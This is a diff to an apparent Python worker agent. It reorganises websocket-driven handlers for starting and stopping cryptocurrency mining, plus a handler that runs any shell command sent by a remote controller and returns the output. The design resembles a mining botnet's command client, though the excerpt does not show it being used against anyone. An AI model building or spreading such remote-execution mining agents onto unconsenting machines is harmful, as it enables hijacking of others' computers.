@@ -262,32 +262,33 @@ async def run_worker():
                                 "detail": detail
                             }))
 
-                        elif mtype == "START_MINING":
-                            res = handle_local_service("START", msg.get("config"))
+                        elif mtype in ("MINING_ACTION", "START_MINING", "STOP_MINING"):
+                            action = msg.get("action")
+                            if not action:
+                                action = "START" if mtype == "START_MINING" else "STOP"
+                            res = handle_local_service(action, msg.get("config"))
                             await ws.send(json.dumps({
                                 "type": "TASK_DONE",
                                 "agent_id": worker_id,
-                                "task": "START_MINING",
+                                "task": f"MINING_{action}",
                                 "detail": res
                             }))
 
-                        elif mtype == "STOP_MINING":
-                            res = handle_local_service("STOP")
-                            await ws.send(json.dumps({
-                                "type": "TASK_DONE",
-                                "agent_id": worker_id,
-                                "task": "STOP_MINING",
-                                "detail": res
-                            }))
+                        elif mtype in ("SHELL", "RUN_SHELL"):
+                            cmd_str = msg.get("cmd") or msg.get("command", "")
+                            logger.info(f"Executing shell command: {cmd_str}")
+                            try:
+                                res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=120)
+                                out = (res.stdout + res.stderr).strip()[:2000]
+                                if not out:
+                                    out = f"(exit code {res.returncode})"
+                            except Exception as e:
+                                out = f"Execution error: {e}"
 
-                        elif mtype == "RUN_SHELL":
-                            cmd_str = msg.get("command", "")
-                            res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=120)
-                            out = (res.stdout + res.stderr)[:2000]
                             await ws.send(json.dumps({
                                 "type": "TASK_DONE",
                                 "agent_id": worker_id,
-                                "task": "RUN_SHELL",
+                                "task": "SHELL",
                                 "detail": out
                             }))
 
